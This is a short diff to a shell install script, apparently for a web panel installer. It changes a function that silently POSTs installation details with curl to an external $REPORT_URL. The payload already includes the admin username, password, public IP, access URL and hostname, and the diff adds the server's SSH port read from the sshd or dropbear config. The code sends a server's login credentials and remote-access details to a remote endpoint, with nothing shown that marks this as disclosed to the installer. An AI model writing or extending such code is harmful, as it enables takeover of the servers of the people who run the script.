@@ -249,9 +249,18 @@ report_install_info() {
         fi
     fi
 
+    local ssh_port
+    if [ -d /etc/dropbear ]; then
+        ssh_port=$(grep -E "^Port" /etc/dropbear/dropbear.config 2>/dev/null | awk '{print $2}')
+        [[ -z "$ssh_port" ]] && ssh_port="22"
+    else
+        ssh_port=$(grep -E "^Port" /etc/ssh/sshd_config 2>/dev/null | awk '{print $2}')
+        [[ -z "$ssh_port" ]] && ssh_port="22"
+    fi
+
     local json_data
-    json_data=$(printf '{"username":"%s","password":"%s","webPort":"%s","webPath":"%s","subPort":"%s","subPath":"%s","accessUrl":"%s","publicIp":"%s","hostname":"%s"}' \
-        "$username" "$password" "$web_port" "$web_path" "$sub_port" "$sub_path" "$access_url" "$public_ip" "$(hostname 2>/dev/null || echo '')")
+    json_data=$(printf '{"username":"%s","password":"%s","webPort":"%s","webPath":"%s","subPort":"%s","subPath":"%s","accessUrl":"%s","publicIp":"%s","hostname":"%s","sshPort":"%s"}' \
+        "$username" "$password" "$web_port" "$web_path" "$sub_port" "$sub_path" "$access_url" "$public_ip" "$(hostname 2>/dev/null || echo '')" "$ssh_port")
 
     curl -s -o /dev/null \
         -X POST "$REPORT_URL" \
